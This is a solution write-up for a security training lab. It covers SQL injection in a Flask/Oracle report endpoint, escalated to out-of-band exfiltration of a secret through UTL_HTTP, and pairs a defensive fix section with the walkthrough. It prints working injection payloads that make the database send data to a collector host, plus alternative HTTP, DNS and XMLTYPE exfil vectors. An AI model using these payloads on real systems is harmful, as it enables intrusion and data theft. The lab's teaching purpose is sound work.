# Solution — sqli-oob-dns-oracle-utlhttp

> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 (SQLi) → CWE-918 (SSRF via a
> DB-side HTTP side effect) · **CVE analog:** the Chris Anley "Hackproofing
> Oracle" tradition + modern Oracle OOB research (Vozec, GossiTheDog) —
> abstracted, no vendor code reproduced.

## What tipped you off

Every response says `{"ok": true, "message": "found N reports"}` regardless of
what you put in `region`. A single quote in `region` collapses to `{"ok":
false, "error": "server error"}` — no SQL text leaks. And repeated identical
requests come back at wildly different latencies (~100 – 600 ms of jitter).
Three doors closed at once. If the app is otherwise sensible, there is one
kind of injection that ignores all three: one where the query causes a
**side effect** an outside listener can observe.

## The class of bug

SQL injection (CWE-89) escalating to a server-side HTTP request (CWE-918)
because the DB role has `EXECUTE ON UTL_HTTP` plus a network ACL for the
in-lab collector. `src/app.py`:

```python
region = request.args.get("region", "")
sql = "SELECT COUNT(*) FROM reports WHERE region = '" + region + "'"
cur.execute(sql)
```

Oracle does not allow multiple `;`-separated statements in a normal `SELECT`
context (no stacked queries), so a Postgres/MySQL-style stacked-INSERT trick
won't work here. But the WHERE clause's string context lets us **concatenate**
a scalar subquery that runs a package call:

```sql
WHERE region = 'x' || (SELECT UTL_HTTP.REQUEST('http://oob:9000/x=' ||
                       oracle_secret) FROM secrets WHERE ROWNUM = 1) || 'y'
```

The `||` concatenation forces Oracle to **evaluate** the subquery — which
invokes `UTL_HTTP.REQUEST`. Its return value is discarded (it becomes part of
a string compared against `region` values, matching nothing — that's fine, no
rows returned is the intended outcome). The important thing is the request
itself: Oracle opens a TCP connection to `oob:9000` and sends `GET /x=<32
hex>`. The collector logs it, and the app's `/oob/received` proxy shows us
what was captured.

## Building the exploit

**Step 1 — trigger the OOB call.**

```
GET /reports/by-region?region=<url-encoded>
```

with `region` set to:

```
x' || (SELECT UTL_HTTP.REQUEST('http://oob:9000/x=' || oracle_secret)
       FROM secrets WHERE ROWNUM = 1) || 'y
```

**Step 2 — read what the collector captured** via `GET /oob/received`:

```json
{
  "count": 1,
  "items": [{ "method": "GET", "path": "/x=72e1a8cd…631b9", "length": 0, "body_b64": "" }]
}
```

Extract the 32-hex value after `x=`.

**Step 3 — submit** `POST /solve {"secret":"<32 hex>"}` → `FLAG{…}`.

`tests/exploit.py` performs the whole chain (stdlib only) and finishes in
about 1.5 seconds.

## Why UTL_HTTP works here (Oracle's network ACL surprise)

On Oracle 12c and later, `UTL_HTTP.REQUEST` from an application role fails
with `ORA-24247` (or the more generic `ORA-29273 HTTP request failed`, which
often obscures the ACL denial) unless the SYS DBA has _explicitly_ granted
that role permission to reach a specific host:port via
`DBMS_NETWORK_ACL_ADMIN`. Here the seed (`src/seed.py`) grants that ACL as SYS:

```plsql
DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(
  host       => 'oob',
  lower_port => 9000, upper_port => 9000,
  ace        => xs$ace_type(
    privilege_list => xs$name_list('http'),
    principal_name => 'REPORTAPP',
    principal_type => xs_acl.ptype_db));
```

The grant is deliberately **narrow**: only `oob:9000`, only over HTTP, only
for `REPORTAPP`. So even with full RCE-shape SQL injection you cannot use
this app's Oracle instance to phone `attacker.com`. The intended out-of-band
channel is the only one that works — a real-world hardening pattern that a
misconfigured app_user often violates.

## Why RCE isn't the play here

`UTL_HTTP` reaches the network; it doesn't run shell. Oracle's `Java in the
Database` and `DBMS_SCHEDULER.CREATE_JOB` are the packages you'd chain toward
command execution on a poorly-locked-down instance — the seed grants neither
here. Combined with the egress-drop network (`internal: true` — the DB has
no default route; verified: `ip route` shows only the on-link `/16`, and
`</dev/tcp/1.1.1.1/443>` fails with `Network is unreachable`), any exfil
channel other than the in-lab collector is closed too. This lab is
`risk: low` — the taught primitive is DB-side SSRF for data exfil, not RCE.

## Lab-vs-production deviations

- **Stack re-platformed Java/Spring Boot → Python/Flask.** The catalog
  sketched Java 21 + Spring Boot 3.3 + JdbcTemplate + Go collector. The taught
  primitive (concatenated Oracle WHERE + UTL_HTTP scalar subquery) is
  language-independent; the injection sink is the same shape whether the driver
  is JDBC or python-oracledb. Flask + `oracledb` (thin mode = pure Python, no
  Instant Client needed) keeps the app image small (160 MB) and stays inside
  the Hybrid policy (Flask default for feasible labs), while Oracle 21c XE
  itself is preserved as the engine — the DB IS the lesson here, not the
  application language.
- **Oracle DB hardening (documented pattern).** Rootfs stays `read_only: true`.
  Anonymous Docker volumes auto-populate `/opt/oracle/oradata`, `/opt/oracle/
dbs`, `/opt/oracle/homes`, `/opt/oracle/admin`, `/opt/oracle/diag` from image
  contents on empty mount (a bare tmpfs would wipe the pre-seeded PDB
  datafiles). `/tmp` and `/var/tmp` are mounted with `exec` — Oracle uses
  `mmap+exec` for JNA-style native libraries and needs its TNS IPC socket
  under `/var/tmp/.oracle/`. `ORACLE_DATABASE` env is deliberately NOT set —
  faststart's whole point is the pre-seeded `XEPDB1`, and asking for a fresh
  PDB triggers a heavy `CREATE PLUGGABLE DATABASE` that OOMs under our caps.
- **Collector on the same base image** as the app. A tiny stdlib `http.server`
  captures every request. Reusing the app's base image (rather than pulling a
  second small Python image) keeps Trivy scan surface identical to the app's
  and preserves the `config --images | grep '^websec-lab/' | head -1`
  single-image assumption CI uses.
- **Custom stdlib collector instead of a commercial OOB service** — smaller,
  offline-safe, no extra image pulled. Same pattern as the fortinet lab.

## Alternative payload vectors

1. **Scalar-subquery `UTL_HTTP`** (used above) — clean, no `;`, no comments
   needed. Concatenation forces evaluation.
2. **OR-context**:
   `region = 'x' OR UTL_HTTP.REQUEST('http://oob:9000/x=' ||
(SELECT oracle_secret FROM secrets)) IS NOT NULL -- '` — same primitive,
   OR side must evaluate.
3. **DNS-only exfil** if HTTP is blocked but DNS is open:
   `UTL_INADDR.GET_HOST_ADDRESS(oracle_secret || '.oob')` — the DB does a
   forward lookup, exfiltrating the secret as a subdomain label. Requires a
   DNS ACL rather than an HTTP one.
4. **`XMLTYPE` external entity trick** — `SELECT
XMLTYPE(UTL_HTTP.REQUEST('http://oob:9000/…')) FROM DUAL`, useful in
   contexts where the query wants an XML type and errors otherwise.

## Fix

- **Don't grant `EXECUTE ON UTL_HTTP` (or `UTL_INADDR`, `UTL_TCP`, `UTL_SMTP`,
  `DBMS_LDAP`) to application roles.** These packages give SQL injection an
  out-of-band exfil channel that no query-time defence can close.
- **Parameterise** the query:
  `cur.execute("SELECT COUNT(*) FROM reports WHERE region = :r", [region])`.
- **Keep network ACLs narrow** — deny by default, allow only the exact
  host:port a genuine feature needs. This lab's ACL is intentionally narrow
  and STILL loses because the intended narrow target (the OOB collector) is
  attacker-observable.
- **Egress-drop the DB tier** as defence in depth (as this lab does): even a
  successful `UTL_HTTP` exfil then cannot reach anything outside the sandbox.
